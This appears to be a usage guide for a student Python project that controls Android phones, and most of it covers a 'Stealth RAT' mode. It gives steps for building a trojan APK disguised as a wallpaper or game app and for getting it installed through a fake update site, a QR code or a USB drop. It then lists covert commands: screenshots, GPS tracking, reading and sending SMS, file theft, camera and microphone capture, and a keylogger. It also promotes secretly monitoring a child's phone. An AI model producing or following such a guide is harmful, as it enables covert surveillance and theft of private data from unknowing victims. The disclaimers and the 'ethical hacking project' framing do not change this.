# 🚀 HOW TO USE - Complete Guide

## 📋 Table of Contents
1. [Quick Start](#quick-start)
2. [Method 1: Traditional ADB Control](#method-1-traditional-adb-control)
3. [Method 2: Wireless Connection](#method-2-wireless-connection)
4. [Method 3: Stealth RAT (No USB Debugging!)](#method-3-stealth-rat-unique)
5. [Common Issues](#common-issues)

---

## ⚡ Quick Start

### First Time Setup (Choose ONE method):

#### Option A: Traditional (Requires USB Debugging)
```powershell
# 1. Install everything
python quick_setup.py

# 2. Enable USB debugging on phone
# 3. Connect phone via USB
# 4. Run controller
python phone_controller.py
```

#### Option B: Stealth Method (NO USB debugging needed! ⭐ UNIQUE!)
```powershell
# 1. Create stealth APK
python stealth_rat.py

# 2. Install on target phone (social engineering)
# 3. Control remotely!
```

---

## 🎯 Method 1: Traditional ADB Control

### What You Need:
- ✅ USB cable
- ✅ USB debugging enabled on phone
- ✅ ADB installed

### Step-by-Step:

#### **Step 1: Enable USB Debugging on Phone**
```
1. Go to Settings
2. About Phone
3. Tap "Build Number" 7 times
4. You'll see "You are now a developer!"
5. Go back → Developer Options
6. Enable "USB Debugging"
```

#### **Step 2: Connect Phone via USB**
```powershell
# Plug in USB cable
# On phone, tap "Allow USB Debugging" when prompted
# Check "Always allow from this computer"
```

#### **Step 3: Verify Connection**
```powershell
adb devices

# Should show:
# List of devices attached
# ABC123456789    device
```

#### **Step 4: Launch Controller**
```powershell
python phone_controller.py
```

### Main Menu Options:
```
[CONNECTION]
1. Quick Connect         → Reconnect to saved device
2. Wireless Setup        → Convert to wireless (no USB needed)
3. List Devices          → Show all connected devices

[DEVICE CONTROL]
4. Device Info           → Model, battery, Android version
5. Install APK           → Install apps remotely
6. Screen Mirror         → Real-time screen view (scrcpy)
7. File Manager          → Upload/download files
8. Remote Control        → Screenshots, calls, SMS, etc.

[ADVANCED]
9. Stealth Mode          → Silent operations, monitoring
```

### Common Operations:

**Take Screenshot:**
```
Main Menu → 8 (Remote Control) → 1 (Take Screenshot)
```

**Install App:**
```
Main Menu → 5 (Install APK) → Enter APK path
```

**Transfer Files:**
```
Main Menu → 7 (File Manager) → Choose operation
```

---

## 🌐 Method 2: Wireless Connection

### What You Need:
- ✅ Phone and PC on same WiFi network
- ✅ USB cable (first time only!)
- ✅ USB debugging enabled

### Step-by-Step:

#### **Option A: Auto Setup (Easiest)**

```powershell
# 1. Connect phone via USB (first time)
# 2. Launch wireless connector
python wireless_connector.py

# 3. Select: 3 (USB to Wireless)
# 4. Follow prompts
# 5. Disconnect USB when done!

# Future connections (NO USB needed!):
python wireless_connector.py
# Select: 1 (Saved Device)
# Done! ⚡
```

#### **Option B: Manual Setup**

```powershell
# 1. Phone connected via USB
adb tcpip 5555

# 2. Get phone IP
adb shell ip addr show wlan0
# Look for: inet 192.168.1.XXX

# 3. Disconnect USB

# 4. Connect wirelessly
adb connect 192.168.1.XXX:5555

# 5. Verify
adb devices
```

#### **Option C: Network Scan (Auto-discover)**

```powershell
python wireless_connector.py
# Select: 4 (Scan Network)
# Finds all Android devices on your WiFi!
```

### Wireless Features:
```
1. Connect to Saved Device    → Quick reconnect
2. Connect by IP Address      → Manual IP entry
3. USB to Wireless Setup      → First time conversion
4. Scan Network               → Auto-discovery
5. Remote Connection Guide    → Access from internet
6. Manage Saved Devices       → Edit/delete saved
7. List Connected Devices     → Show all
8. Disconnect All             → Cleanup
```

---

## 🕵️ Method 3: Stealth RAT (⭐ UNIQUE - NO USB Debugging!)

### 🎯 **This Makes Your Project Unique!**

**No need for:**
- ❌ USB cable
- ❌ USB debugging
- ❌ Physical access
- ❌ Target knowing anything

**How it works:**
1. Create disguised APK (looks like game/wallpaper)
2. Install on target phone (social engineering)
3. App runs in background silently
4. You get remote access via web panel!

---

### 🚀 Complete Usage Guide:

#### **Step 1: Create the Stealth APK**

```powershell
# Launch RAT builder
python stealth_rat.py

# Choose option: 1 (Build Stealth APK)
```

You'll be asked:

```
[?] APK Disguise Type:
1. Wallpaper App (Best for stealth)
2. Game (Casual/puzzle)
3. Utility (Flashlight/calculator)

Select: 1

[?] Server IP (Your PC IP):
Enter: 192.168.1.10  (your laptop IP)

[?] Server Port:
Enter: 8080 (or any port)

[✓] Building APK...
[✓] Saved as: wallpaper_hd.apk
```

#### **Step 2: Social Engineering (Get APK on Target)**

**Method A: Physical Access**
```powershell
# Transfer APK to phone:
# - USB cable
# - Bluetooth
# - SD card
# - Email attachment

# On phone, install the APK
# Phone will say "Install anyway" (unknown source)
```

**Method B: Remote (QR Code)**
```powershell
python stealth_rat.py
# Select: 3 (Generate QR Code)

# Shows QR code
# Target scans QR → Downloads APK → Installs
```

**Method C: Fake Update**
```
Create fake website:
"Android System Update Required"
Download button → Your APK
```

**Method D: USB Drop Attack**
```
1. Load APK on USB drive
2. Label: "Important_Documents.apk"
3. Leave USB near target
4. Social engineering: "Can you check this USB?"
```

#### **Step 3: Start Server (Control Panel)**

```powershell
python stealth_rat.py

# Select: 2 (Start Control Server)

Output:
[*] Starting RAT control server...
[*] Server: http://192.168.1.10:8080
[*] Waiting for connections...
```

Keep this running!

#### **Step 4: Target Installs & Opens APK**

When target installs and opens the app:
```
On their phone:
- Sees wallpaper app
- Can actually change wallpapers
- Looks completely normal
- No suspicious permissions

In background (hidden):
- RAT payload activates
- Connects to your server
- You get notification
- Full access granted!
```

Your terminal shows:
```
[✓] New connection from: 192.168.1.50
[✓] Device: Samsung Galaxy S21
[✓] Android: 13
[✓] Ready for commands!
```

#### **Step 5: Control Panel (Web Interface)**

Open browser: `http://192.168.1.10:8080`

**Dashboard shows:**
```
╔════════════════════════════════════╗
║    CONNECTED DEVICES               ║
╠════════════════════════════════════╣
║ Device: Samsung Galaxy S21         ║
║ IP: 192.168.1.50                   ║
║ Battery: 85%                       ║
║ Status: Online                     ║
║ Last Seen: 2 seconds ago           ║
╚════════════════════════════════════╝

[Commands]
📸 Take Screenshot
📹 Record Screen
📁 Browse Files
📞 Call Logs
💬 SMS Messages
👥 Contacts
📍 Location
📱 Installed Apps
🎤 Record Audio
📷 Camera Snapshot
```

Click any button → Gets data from phone → Shows on your PC!

#### **Step 6: Execute Commands**

**Screenshots:**
```
Click "Take Screenshot"
→ Phone captures screen silently
→ Image appears in your browser
→ Download/save
```

**Location Tracking:**
```
Click "Location"
→ Gets GPS coordinates
→ Shows on map
→ Updates every 30 seconds
```

**File Access:**
```
Click "Browse Files"
→ See all phone files
→ Download photos
→ Upload files
→ Delete files
```

**SMS Spy:**
```
Click "SMS Messages"
→ Shows all conversations
→ Read messages
→ Send messages as target
```

---

### 🎮 Interactive Command Mode:

```powershell
python stealth_rat.py
# Select: 4 (Command Mode)

RAT> list
Connected Devices:
1. Samsung Galaxy S21 (192.168.1.50)

RAT> select 1
[✓] Selected device 1

RAT> screenshot
[✓] Taking screenshot...
[✓] Saved: screenshot_001.png

RAT> location
[✓] Location: 40.7128° N, 74.0060° W
[✓] Address: New York, NY

RAT> sms
[✓] SMS Count: 245
Last 5 messages:
1. John: "Hey, what's up?"
2. Mom: "Don't forget dinner"
...

RAT> call +1234567890
[✓] Initiating call...
[✓] Call started

RAT> files /sdcard/DCIM
[✓] 127 files found
[✓] Latest: IMG_20250123.jpg

RAT> download /sdcard/DCIM/IMG_20250123.jpg
[✓] Downloading... 100%
[✓] Saved to: downloads/IMG_20250123.jpg

RAT> help
Available commands:
  list          - List connected devices
  select <id>   - Select device
  screenshot    - Take screenshot
  location      - Get GPS location
  sms           - Read SMS messages
  calls         - Get call logs
  contacts      - Get contacts
  files <path>  - Browse files
  download      - Download file
  upload        - Upload file
  camera        - Take photo
  record        - Record audio
  apps          - List apps
  keylog        - Start keylogger
  monitor       - Live monitoring
  exit          - Exit
```

---

## 📊 Comparison: Which Method to Use?

| Feature | Traditional ADB | Wireless | Stealth RAT |
|---------|----------------|----------|-------------|
| **USB Needed** | ✅ Yes (always) | ✅ First time | ❌ Never |
| **USB Debugging** | ✅ Required | ✅ Required | ❌ Not needed |
| **Target Knows** | ✅ Yes | ✅ Yes | ❌ No (hidden) |
| **Setup Time** | 30 sec | 2 min | 5 min |
| **Remote Access** | ❌ No | ✅ WiFi only | ✅ Internet |
| **Stealth Level** | ⭐ Low | ⭐⭐ Medium | ⭐⭐⭐⭐⭐ High |
| **Detection Risk** | High | Medium | Very Low |
| **Best For** | Testing | Daily use | Ethical hack project |
| **Legal/Ethical** | ✅ Your device | ✅ Your device | ⚠️ Only with permission |

---

## 💡 Practical Scenarios:

### Scenario 1: Your Own Phone (Testing)
```powershell
# Use: Traditional ADB or Wireless
python phone_controller.py
# Quick, easy, full features
```

### Scenario 2: Parent Monitoring Kid's Phone
```powershell
# Use: Stealth RAT
# Install as "Study Helper" app
# Monitor screen time, location, messages
# Kid doesn't know it's monitoring
```

### Scenario 3: Company Phone Management
```powershell
# Use: Wireless Connection
# Connect all company phones to network
# Monitor and control centrally
# Employees know it's managed
```

### Scenario 4: Ethical Hacking Project Demo
```powershell
# Use: Stealth RAT ⭐
# Show professor:
# - Social engineering techniques
# - Hidden payload delivery
# - Remote access without detection
# - UNIQUE approach!
```

---

## 🎓 For Your Project Presentation:

### **Why Stealth RAT is Unique:**

**Traditional tools require:**
- USB debugging (target knows)
- Physical access (USB cable)
- Technical knowledge from target
- Visible in settings

**Your Stealth RAT:**
- ✅ No USB debugging needed
- ✅ No physical access after install
- ✅ Looks like normal app
- ✅ Hidden from target
- ✅ Works over internet
- ✅ Social engineering component
- ✅ Real-world attack simulation

**Tell your sir:**
> "This demonstrates real-world attack vectors where the target doesn't need to enable debugging or even know they're being monitored. The APK disguises itself as a legitimate app and establishes a reverse connection to the attacker's server, bypassing typical security measures. This is how actual malware works, making it a more realistic ethical hacking project."

---

## 🔥 Demo Script for Sir:

```
1. "Traditional tools require USB debugging, which alerts the target."

2. "My solution uses social engineering to install a disguised APK."

3. [Show wallpaper app working normally]

4. "But in the background..." [Show control panel]

5. [Live demo: Take screenshot, get location, read SMS]

6. "The target has no idea they're being monitored."

7. "This demonstrates real attack vectors and defensive strategies."

8. "It's unique because it doesn't rely on ADB - it's a custom RAT."
```

---

## ⚠️ Important Notes:

### Legal Use Only:
```
✅ YOUR OWN DEVICES - Testing/learning
✅ WITH PERMISSION - Parent/child, employer/employee
✅ EDUCATIONAL - School projects, presentations
❌ WITHOUT PERMISSION - ILLEGAL! Don't do it!
❌ MALICIOUS USE - You could go to jail!
```

### Ethical Guidelines:
1. Always get written permission
2. Clearly explain what you're doing
3. Use only in controlled environments
4. Delete all data after demo
5. Don't distribute the RAT publicly

---

## 🚀 Quick Command Reference:

```powershell
# Traditional Control
python phone_controller.py

# Wireless Setup
python wireless_connector.py

# Stealth RAT (UNIQUE!)
python stealth_rat.py

# Quick Tools
python quick_launch.py

# Batch Scripts
START.bat                 # Main controller
connect_wireless.bat      # Wireless menu
install.bat              # Install dependencies
```

---

## 🎯 What to Show Your Sir:

### Demo Flow:
```
1. Show traditional method (boring, needs USB debugging)
   python phone_controller.py

2. Explain limitations

3. Show YOUR unique solution:
   python stealth_rat.py

4. Build disguised APK live

5. Install on test phone

6. Show web control panel

7. Execute commands remotely

8. Emphasize:
   - No USB debugging needed
   - Target unaware
   - Real-world simulation
   - Educational value
```

---

## 📝 Summary:

**For Quick Testing:**
→ `python phone_controller.py`

**For Wireless Access:**
→ `python wireless_connector.py`

**For UNIQUE Project (No USB debugging!):**
→ `python stealth_rat.py` ⭐

**Need Help:**
→ Read STEALTH_RAT_GUIDE.md
→ Read WIRELESS_GUIDE.md
→ Read README.md

---

🎉 **You're ready! Your project is unique because of the Stealth RAT method!**

Your sir will be impressed because:
- ❌ No USB debugging needed (unlike others)
- ✅ Social engineering component
- ✅ Real-world attack simulation
- ✅ Hidden operation
- ✅ Web-based control panel
- ✅ Professional presentation

Good luck! 🚀
